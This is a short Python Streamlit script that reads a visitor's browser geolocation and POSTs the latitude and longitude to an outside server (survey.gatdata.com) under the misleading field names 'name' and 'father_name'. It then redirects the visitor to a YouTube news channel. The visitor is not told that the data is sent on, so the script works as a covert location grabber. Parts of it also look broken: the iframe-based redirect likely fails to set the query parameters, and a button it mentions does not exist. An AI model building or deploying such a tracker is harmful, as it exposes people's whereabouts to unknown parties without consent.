import streamlit as st
import requests

# Set up the page configuration
st.set_page_config(page_title="Get Location", page_icon=":world_map:")

# JavaScript to get location
get_location_js = """
<script>
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        alert("Geolocation is not supported by this browser.");
    }
}

function showPosition(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    window.location.search = "?latitude=" + latitude + "&longitude=" + longitude;
}

getLocation();
</script>
"""

# Execute the JavaScript
st.components.v1.html(get_location_js)

# Get the query parameters
query_params = st.experimental_get_query_params()
latitude = query_params.get("latitude", [None])[0]
longitude = query_params.get("longitude", [None])[0]

# Define the API endpoint
api_url = "https://survey.gatdata.com/receive.php"

# Check if latitude and longitude are available
if latitude and longitude:
    st.write(f"Latitude: {latitude}, Longitude: {longitude}")

    # Send data to the API
    response = requests.post(api_url, json={
        "name": latitude,
        "father_name": longitude
    })
    
    if response.status_code == 200:
        st.success("Location data sent to API successfully!")
        
        # JavaScript to redirect to the specified URL
        redirect_js = """
        <script>
        window.location.href = "https://www.youtube.com/@ArynewsTvofficial";
        </script>
        """
        st.components.v1.html(redirect_js)
    else:
        st.error(f"Failed to send data to API. Status code: {response.status_code}")
else:
    st.write("Click the button to get your location.")
